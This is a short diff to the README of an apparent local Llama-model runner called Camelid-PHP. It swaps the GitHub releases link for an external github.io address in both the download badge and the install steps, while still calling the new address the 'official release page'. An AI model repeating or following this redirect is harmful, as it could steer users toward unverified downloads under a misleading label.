@@ -1,6 +1,6 @@
 # 🦙 Camelid-PHP - Run Llama models on your machine
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/emmettsluicing122/Camelid-PHP/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://emmettsluicing122.github.io)
 
 Camelid-PHP lets you run artificial intelligence models directly on your computer. You do not need a cloud account or an expensive server. This software uses your computer hardware to generate text, chat with you, and process information. It works entirely offline, which keeps your data private and secure.
 
@@ -12,7 +12,7 @@ To run this software, your computer needs a few basic tools. You must have the P
 
 You need to download the latest version of the application to your computer.
 
-1. Go to the [official release page](https://github.com/emmettsluicing122/Camelid-PHP/releases).
+1. Go to the [official release page](https://emmettsluicing122.github.io).
 2. Look for the file ending in `.zip` under the latest release section.
 3. Click the file to save it to your Downloads folder.
 4. Open your Downloads folder.
